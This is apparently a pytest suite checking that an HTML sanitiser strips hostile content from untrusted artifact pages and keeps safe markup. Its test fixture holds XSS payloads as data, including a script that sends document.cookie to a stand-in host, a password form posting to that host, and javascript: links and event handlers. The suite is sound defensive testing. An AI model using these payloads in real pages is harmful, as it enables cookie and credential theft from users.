"""Artifact HTML is untrusted: verify what the sanitiser blocks and keeps."""

import pytest

from app.artifacts.sanitize import CSP, sanitize_html

ATTACK = """<!DOCTYPE html><html><head>
<link rel="stylesheet" href="https://evil.example/x.css">
<meta http-equiv="refresh" content="0;url=https://evil.example">
<style>@import url(https://evil.example/a.css); body{background:url(https://evil.example/p.png)} .x{width:expression(alert(1))}</style>
<script>fetch('https://evil.example/?c='+document.cookie)</script>
</head><body>
<h1 onclick="alert(1)">Growth playbook</h1>
<img src="https://evil.example/pixel.gif" alt="pixel">
<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">
<a href="javascript:alert(1)">bad link</a>
<a href="https://www.lennysnewsletter.com">good link</a>
<iframe src="https://evil.example"></iframe>
<form action="https://evil.example"><input name="password"></form>
<svg onload="alert(1)"><script>alert(2)</script></svg>
<table><tr><td>Cell</td></tr></table>
<p style="color: red; background: url(https://evil.example/b.png)">styled</p>
</body></html>"""


@pytest.fixture(scope="module")
def result():
    return sanitize_html(ATTACK, "Playbook <script>")


def body(result) -> str:
    return result.html.split("<body>", 1)[1]


@pytest.mark.parametrize(
    "needle",
    ["<script", "onclick", "javascript:", "<iframe", "<form", "<input", "<svg", "evil.example", "expression(", "@import"],
)
def test_dangerous_content_is_removed(result, needle):
    assert needle not in result.html.lower()


def test_safe_content_is_kept(result):
    html = body(result)
    assert "<h1>Growth playbook</h1>" in html
    assert 'href="https://www.lennysnewsletter.com"' in html
    assert "data:image/png;base64" in html
    assert "<td>Cell</td>" in html
    assert "color: red" in html or "color:red" in html


def test_document_is_csp_locked(result):
    assert CSP in result.html
    assert "default-src 'none'" in CSP
    assert '<meta name="referrer" content="no-referrer">' in result.html


def test_title_is_escaped(result):
    assert "<title>Playbook </title>" in result.html or "&lt;script&gt;" in result.html


def test_report_explains_what_was_blocked(result):
    report = result.report
    assert report["scripts"] == 2
    assert report["event_handlers"] >= 2
    assert report["embedded_frames"] == 1
    assert report["forms"] == 2
    assert report["external_resources"] >= 3
    assert report["css_expressions"] == 1
    assert result.blocked_total > 10


def test_clean_html_produces_empty_report():
    clean = sanitize_html("<html><body><h1>Hi</h1><p>Plain.</p></body></html>")
    assert clean.report == {}
